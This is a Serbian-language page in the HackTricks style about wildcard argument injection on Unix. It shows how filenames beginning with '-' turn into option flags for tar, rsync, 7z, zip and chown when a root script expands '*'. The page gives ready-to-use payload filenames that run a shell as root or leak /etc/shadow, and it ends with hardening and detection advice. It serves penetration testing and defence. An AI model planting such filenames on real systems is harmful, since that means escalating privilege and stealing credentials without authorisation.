# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (poznat i kao *glob*) **injekcija argumenata** se dešava kada privilegovani skript pokreće Unix binarni fajl kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, … sa necitiranim wildcard-om kao što je `*`.
> Pošto ljuska širi wildcard **pre** izvršavanja binarnog fajla, napadač koji može da kreira fajlove u radnom direktorijumu može da napravi imena fajlova koja počinju sa `-` tako da se tumače kao **opcije umesto podataka**, efikasno krijući proizvoljne zastavice ili čak komande.
> Ova stranica prikuplja najkorisnije primitivne tehnike, nedavna istraživanja i moderne detekcije za 2023-2025.

## chown / chmod

Možete **kopirati vlasnika/grupu ili dozvole bitova proizvoljnog fajla** zloupotrebom `--reference` zastavice:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kada root kasnije izvrši nešto poput:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` je ubačen, uzrokujući da *svi* odgovarajući fajlovi naslede vlasništvo/dozvole `/root/secret``file`.

*PoC & alat*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinovani napad).  
Pogledajte i klasični DefenseCode rad za detalje.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Izvršite proizvoljne komande zloupotrebom **checkpoint** funkcije:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Kada root pokrene npr. `tar -czf /root/backup.tgz *`, `shell.sh` se izvršava kao root.

### bsdtar / macOS 14+

Podrazumevani `tar` na novijim macOS (zasnovan na `libarchive`) *ne* implementira `--checkpoint`, ali i dalje možete postići izvršavanje koda sa **--use-compress-program** flagom koji vam omogućava da navedete spoljašnji kompresor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Kada privilegovani skript pokrene `tar -cf backup.tar *`, `/bin/sh` će biti pokrenut.

---

## rsync

`rsync` vam omogućava da prepravite udaljenu ljusku ili čak udaljeni binarni fajl putem komandnih opcija koje počinju sa `-e` ili `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ako root kasnije arhivira direktorijum sa `rsync -az * backup:/srv/`, injektovana zastavica pokreće vašu ljusku na udaljenoj strani.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mod).

---

## 7-Zip / 7z / 7za

Čak i kada privilegovani skript *defensivno* prefiksira wildcard sa `--` (da zaustavi parsiranje opcija), 7-Zip format podržava **datoteke sa listom datoteka** prefiksiranjem imena datoteke sa `@`. Kombinovanjem toga sa simboličkom vezom možete *ekstraktovati proizvoljne datoteke*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ako root izvrši nešto poput:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip će pokušati da pročita `root.txt` (→ `/etc/shadow`) kao listu fajlova i odustati, **štampajući sadržaj na stderr**.

---

## zip

`zip` podržava flag `--unzip-command` koji se prosleđuje *verbatim* sistemskoj ljusci kada će se arhiva testirati:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injectujte zastavicu putem kreiranog imena datoteke i sačekajte da privilegovani skript za pravljenje rezervnih kopija pozove `zip -T` (testiranje arhive) na rezultantnoj datoteci.

---

## Dodatni binarni programi ranjivi na injekciju džokera (brza lista 2023-2025)

Sledeće komande su zloupotrebljavane u modernim CTF-ovima i stvarnim okruženjima. Teret je uvek kreiran kao *ime datoteke* unutar pisive direktorijuma koji će kasnije biti obrađen sa džokerom:

| Binarni program | Zastavica za zloupotrebu | Efekat |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → proizvoljni `@file` | Čitanje sadržaja datoteke |
| `flock` | `-c <cmd>` | Izvršavanje komande |
| `git`   | `-c core.sshCommand=<cmd>` | Izvršavanje komande putem git-a preko SSH |
| `scp`   | `-S <cmd>` | Pokretanje proizvoljnog programa umesto ssh |

Ove primitivne komande su manje uobičajene od klasičnih *tar/rsync/zip*, ali ih vredi proveriti prilikom lova.

---

## Detekcija i učvršćivanje

1. **Onemogućite globbing ljuske** u kritičnim skriptama: `set -f` (`set -o noglob`) sprečava ekspanziju džokera.
2. **Citat ili eskapiranje** argumenata: `tar -czf "$dst" -- *` nije *sigurno* — preferirajte `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Eksplicitne putanje**: Koristite `/var/www/html/*.log` umesto `*` kako napadači ne bi mogli da kreiraju susedne datoteke koje počinju sa `-`.
4. **Najmanje privilegije**: Pokrećite poslove pravljenja rezervnih kopija/održavanja kao nepovlašćeni servisni nalog umesto root-a kad god je to moguće.
5. **Praćenje**: Elasticova unapred izgrađena pravila *Potencijalna ljuska putem injekcije džokera* traži `tar --checkpoint=*`, `rsync -e*`, ili `zip --unzip-command` odmah praćeno procesom deteta ljuske. EQL upit može biti prilagođen za druge EDR-ove.

---

## Reference

* Elastic Security – Pravilo Detektovana potencijalna ljuska putem injekcije džokera (poslednje ažurirano 2025)
* Rutger Flohil – “macOS — Injekcija džokera u tar” (18. decembar 2024)

{{#include ../../banners/hacktricks-training.md}}
